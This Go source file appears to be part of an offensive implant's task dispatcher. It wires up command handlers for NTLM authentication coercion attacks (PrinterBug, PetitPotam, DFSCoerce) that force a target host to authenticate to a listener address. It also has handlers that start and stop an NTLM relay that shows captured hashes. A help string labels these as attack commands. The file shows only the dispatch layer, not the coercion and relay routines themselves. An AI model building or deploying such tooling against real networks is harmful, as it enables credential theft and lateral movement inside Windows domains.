//go:build linux || windows || darwin

package main

import (
	"fmt"
	"strings"
)

// ── Coerce Handlers ──

func handleCoercePrinterBug(task Task, res *TaskResult) {
	args := strings.Fields(task.Command)
	if len(args) < 2 {
		res.Error = "usage: coerce_printerbug <target> <listenAddr>"
		return
	}
	out, err := coercePrinterBug(args[0], args[1])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleCoercePetitPotam(task Task, res *TaskResult) {
	args := strings.Fields(task.Command)
	if len(args) < 2 {
		res.Error = "usage: coerce_petitpotam <target> <listenAddr>"
		return
	}
	out, err := coercePetitPotam(args[0], args[1])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleCoerceDFS(task Task, res *TaskResult) {
	args := strings.Fields(task.Command)
	if len(args) < 2 {
		res.Error = "usage: coerce_dfs <target> <listenAddr>"
		return
	}
	out, err := coerceDFSCoerce(args[0], args[1])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

// ── Relay Handlers ──

func handleRelayNTLMStart(task Task, res *TaskResult) {
	args := strings.Fields(task.Command)
	if len(args) < 1 {
		res.Error = "usage: relay_ntlm_start <listenAddr> [forwardTarget]"
		return
	}
	listenAddr := args[0]
	forwardTarget := ""
	if len(args) > 1 {
		forwardTarget = args[1]
	}
	out, err := startNTLMRelay(listenAddr, forwardTarget)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleRelayNTLMStop(task Task, res *TaskResult) {
	out, err := stopNTLMRelay()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

// ── Informational Handler ──

func handleNTLMHelp(task Task, res *TaskResult) {
	res.Output = fmt.Sprintf(`NTLM Relay & Coerce Attack Commands:
  coerce_printerbug <target> <listenAddr>  - Trigger PrinterBug (MS-PR) coercion
  coerce_petitpotam <target> <listenAddr>  - Trigger PetitPotam (MS-EFSR) coercion
  coerce_dfs <target> <listenAddr>         - Trigger DFSCoerce (MS-DFSNM) coercion
  relay_ntlm_start <listenAddr> [target]   - Start NTLM relay listener
  relay_ntlm_stop                          - Stop relay and show captured hashes`)
}
